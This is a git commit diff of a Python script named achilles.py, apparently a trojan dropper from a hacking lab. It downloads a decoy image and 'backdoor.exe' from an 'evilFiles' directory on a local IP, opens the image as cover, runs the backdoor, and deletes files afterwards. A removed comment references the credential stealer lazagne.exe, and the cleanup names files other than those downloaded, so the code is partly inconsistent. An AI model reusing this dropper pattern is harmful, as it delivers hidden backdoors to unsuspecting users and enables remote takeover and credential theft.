07bda67407e9b80d3d44ffd8bd8655780719035f
Ryan Valdriz <ryvaldriz101@gmail.com>
2020-09-04 18:39:23 -0400

    ach

--- achilles.py
+++ achilles.py
@@ -16,10 +16,12 @@ temp_dir = tempfile.gettempdir()
 os.chdir(temp_dir)
 
 download("http://10.0.2.4/evilFiles/aston-martin-dbz.jpg")
-# subprocess.run("sudo chmod +x lazagne.exe", shell=True)
 command = "aston-martin-dbz.jpg " #sys command for windows machines
 result = subprocess.Popen(command, shell=True)
 
 download("http://10.0.2.4/evilFiles/backdoor.exe")
 subprocess.call("backdoor.exe", shell=True)
-os.remove("lazagne.exe")
+
+os.remove("car.jpg")
+os.remove("reverse_backdoor.exe")
+
